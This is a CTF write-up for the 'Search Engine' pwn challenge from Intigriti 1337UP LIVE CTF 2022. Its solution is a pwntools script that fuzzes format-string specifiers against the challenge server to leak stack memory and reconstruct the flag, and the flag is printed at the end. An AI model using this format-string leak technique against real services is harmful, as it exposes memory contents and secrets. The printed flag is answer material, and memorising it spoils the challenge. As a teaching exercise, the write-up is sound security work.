---
name: Search Engine (2022)
event: Intigriti 1337UP LIVE CTF 2022
category: Pwn
description: Writeup for Search Engine (Pwn) - Intigriti 1337UP LIVE CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Search Engine

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/BekVaShD9HE/0.jpg)](https://youtu.be/BekVaShD9HE "Intigriti 1337UP LIVE CTF 2022: Search Engine")

## Challenge Description

> In an attempt to block third party software, we've been using our very own search engine! It doesn't yet have every feature, but at least it's very secure!

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

context.log_level = 'info'

flag = ''

# Let's fuzz x values
for i in range(12, 16):
    try:
        # Connect to server
        io = remote('searchengine.ctf.intigriti.io', 1337, level='warn')
        # Format the counter
        # e.g. %i$p will attempt to print [i]th pointer (or string/hex/char/int)
        io.sendline('%{}$p'.format(i).encode())
        # Receive the response (leaked address followed by '.' in this case)
        io.recvuntil(b'No result found. You searched for - ')
        result = io.recv()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up flag
                flag += reversed_hex.decode()
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print and close
info(flag)
```
{% endcode %}

Flag: `1337UP{Th3s3_f0rm4ts_ar3_wh4ck!}`
